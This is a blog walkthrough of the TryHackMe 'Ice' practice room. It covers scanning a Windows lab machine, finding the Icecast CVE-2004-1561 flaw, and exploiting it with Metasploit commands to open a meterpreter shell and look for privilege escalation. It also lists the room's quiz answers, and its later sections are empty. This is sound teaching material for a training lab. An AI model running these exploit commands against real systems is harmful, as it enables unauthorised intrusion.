---
title: "TryHackMe Ice - Walkthrough"
toc: true
toc_label: "Table of Contents"
toc_icon: "list-alt"
categories:
  - Blog
tags:
  - Cybersecurity
  - Windows
  - Penetration Testing
  - Ethical Hacking
  - TryHackMe
  - CTF
  - Privilege Escalation
  - Machines
teaser: assets/images/thm/thm-ice-00.png  
tagline: "ICE - Tryhackme Walkthrough by Nisha."
header:
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/thm/thm-ice-0.png
  caption: "Photo credit: [**imgur**](https://imgur.com/6Ijftag)"
---


<h5>Deploy & hack into a Windows machine, exploiting a very poorly secured media server. </h5>

<img src="/assets/images/thm/ice-1.png">

<strong> Room Link: </strong> <a href="https://tryhackme.com/r/room/ice"> https://tryhackme.com/r/room/ice</a>


{% include toc %}

## Task 1 - Connect 

Get connected to the TryHackMe network using OpenVPN. Make sure to first download your configuration file from <a href="http://tryhackme.com/access ">your access page. </a>



## Task 2 - Recon

Click on Start Machine to deploy the machine!

<img src="/assets/images/thm/thm-ice-2.png">

Time to Scan and Enumerate our target!


An NMAP scan reveals the following ports were discovered to be open:

<img src="/assets/images/thm/thm-ice-3.png">

<strong> Q: One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on? </strong><br>
<em> Answer: 3389</em>




<strong> Q: What service did nmap identify as running on port 8000? (First word of this service) </strong><br>
<em> Answer: Icecast </em>

<img src="/assets/images/thm/thm-ice-4.png">


<strong> Q: What does Nmap identify as the hostname of the machine? (All caps for the answer) </strong><br>
<em> Answer: DARK-PC </em>

<img src="#">


## Task 3 - Gain Access

In this task we must find a way to exploit any vulnerable services on the target to gain a foothold. The cvedetails website reveals that the impact score and the CVE number for this vulnerability as displayed in the image below. 


<strong> Q: What is the Impact Score for this vulnerability? Use <a href="https://www.cvedetails.com">https://www.cvedetails.com </a> for this question and the next.  </strong><br>
<em> Answer: 6.4 </em>

<img src="/assets/images/thm/thm-ice-6.png">


<strong> Q: What is the CVE number for this vulnerability?  </strong><br>
<em> Answer: CVE-2004-1561 </em>

It is time to use the information that we have collected to locate an exploit for our target.  We will use automation for this exploitation exercise with Metasploit being our tool of choice. 

Type "msfconsole" to launch the Metasploit Framework. <br>

<img src="/assets/images/thm/thm-ice-7.png">

<strong> Q: After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the Metasploit module. </strong><br>
<em> Answer: exploit/windows/http/icecast_header</em>

<img src="/assets/images/thm/thm-ice-8.png">

> use exploit/windows/http/icecast_header  

<img src="/assets/images/thm/thm-ice-9.png">

> set RHOSTS 10.2.119.123
<img src="/assets/images/thm/thm-ice-10.png">

> set LHOST tun0

<img src="/assets/images/thm/thm-ice-11.png">


<strong> # set LHOST <em> attackerIPaddress or interface  

> exploit 

<img src="/assets/images/thm/thm-ice-12.png">



## Task 4 - Escalate

<h5> Our goal for this task is to complete any local enumeration to discover paths to escalte our privileges in our quest to gain Admin powers. </h5>


<strong> Q: Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now? </strong><br>
<em> Answer: meterpreter </em>


 > getuid 

<strong> Q: What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module. </strong><br>
<em> Answer: Dark </em>




<strong> Q: What build of Windows is the system? </strong><br>
<em> Answer: 7601 </em>

<img src="/assets/images/thm/thm-ice-13.png">


<strong> Q:Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running? </strong><br>
<em> Answer: x64 </em>


Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete* <br>

>  run post/multi/recon/local_exploit_suggester

<strong> Q: Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit? </strong><br>
<em> Answer: exploit/windows/local/bypassuac_eventvwr </em>

<img src="/assets/images/thm/thm-ice-14.png">


<strong> Q: What build of Windows is the system? </strong><br>
<em> Answer: 7601 </em>



<img src="/assets/images/thm/thm-ice-15.png">
<img src="/assets/images/thm/thm-ice-16.png">

<img src="/assets/images/thm/thm-ice-17.png">
<img src="/assets/images/thm/thm-ice-18.png">



## Task 5 - Looting


<img src="/assets/images/thm/thm-ice-19.png">




## Task 6 - Post-Exploitation

## Task 7 - Extra Credit

